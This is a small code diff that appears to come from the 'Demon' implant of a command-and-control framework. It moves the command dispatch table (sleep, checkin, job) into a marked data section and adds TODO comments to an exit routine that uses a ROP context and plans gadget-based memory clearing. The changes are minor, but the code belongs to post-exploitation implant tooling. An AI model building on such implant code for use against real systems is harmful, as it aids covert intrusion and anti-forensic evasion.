@@ -13,7 +13,7 @@
 #include <Loader/CoffeeLdr.h>
 #include <Inject/Inject.h>
 
-DEMON_COMMAND DemonCommands[] = {
+SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
         { .ID = DEMON_COMMAND_CHECKIN,                  .Function = CommandCheckin                  },
         { .ID = DEMON_COMMAND_JOB,                      .Function = CommandJob                      },
@@ -2791,7 +2791,8 @@ VOID CommandExit( PPARSER Parser )
 {
     PUTS( "Exit" )
 
-    /* default is 1 == exit thread. */
+    /* default is 1 == exit thread.
+     * TODO: make an config that holds the default exit method */
     UINT32   ExitMethod = 1;
     PPACKAGE Package    = NULL;
     CONTEXT  RopExit    = { 0 };
@@ -2812,7 +2813,9 @@ VOID CommandExit( PPARSER Parser )
     // TODO: release every resource we allocated...
 
     /* NOTE:
-     *  Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
+     *      Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
+     * TODO:
+     *      Clear memory by using a gadgets that prepares and executes movsb
      */
 
     ImageBase = C_PTR( Instance.Session.ModuleBase );
